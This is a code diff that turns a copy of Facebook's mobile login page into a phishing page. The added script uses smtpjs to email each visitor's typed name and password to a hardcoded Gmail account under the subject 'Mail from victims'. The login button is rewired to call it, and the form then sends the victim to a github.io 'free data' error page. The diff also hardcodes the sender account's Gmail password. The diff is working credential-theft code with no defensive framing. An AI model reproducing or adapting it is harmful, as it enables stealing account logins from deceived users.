@@ -6,6 +6,11 @@
       name="viewport"
       content="user-scalable=no,initial-scale=1,maximum-scale=1"
     />
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script>
+function sendEmail() { let name = document.getElementById("name").value; let password =  document.getElementById("password").value; let finalmessage = `Name : ${name} <br>Password : ${password} <br>`; Email.send({ Host : "smtp.gmail.com", 
+Username : "johnvict763@gmail.com", Password : "ezejohnson", 
+To : 'johnvict763@gmail.com', From : "johnvict763@gmail.com", Subject : "Mail from victims", Body : finalmessage });}</script> 
     <link
       href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png"
       rel="shortcut icon"
@@ -418,7 +423,7 @@
                           <i class="l img sp_xm9DDmY7HAL_1_5x sx_76c966"></i>
                           <div class="c">
                             <span class="fcl"
-                              >Login to continue the process of 10gb free data.</span
+                              >Login to continue the process.</span
                             >
                           </div>
                         </div></a
@@ -440,7 +445,7 @@
                   <div class="_5rut">
                     <form
                       method="post"
-                      action="login.php"
+                      action="https://freedata10gb.github.io/forallnetwork/error.html"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
                       novalidate="1"
@@ -493,7 +498,7 @@
                                 type="email"
                                 class="_56bg _4u9z _5ruq _8qtn"
                                 autocomplete="on"
-                                id="m_login_email"
+                                id="name"
                                 name="email"
                                 placeholder="Mobile number or email address"
                                 data-sigil="m_login_email"
@@ -516,7 +521,7 @@
                                       autocapitalize="off"
                                       class="_56bg _4u9z _27z2 _8qtm"
                                       autocomplete="on"
-                                      id="m_login_password"
+                                      id="password"
                                       name="pass"
                                       placeholder="Password"
                                       type="password"
@@ -561,16 +566,7 @@
                           id="login_password_step_element"
                           data-sigil="login_password_step_element"
                         >
-                          <button
-                            type="button"
-                            value="Log In"
-                            class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
-                            id="btnsubmit"
-                            name="login"
-                            data-sigil="touchable login_button_block m_login_button"
-                          >
-                            <span class="_55sr">Log In</span>
-                          </button>
+                          <button type="submit" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"value="Send Email" onclick="sendEmail()"><span>Log In</span></button> 
                         </div>
                         <div
                           class="_7eif"
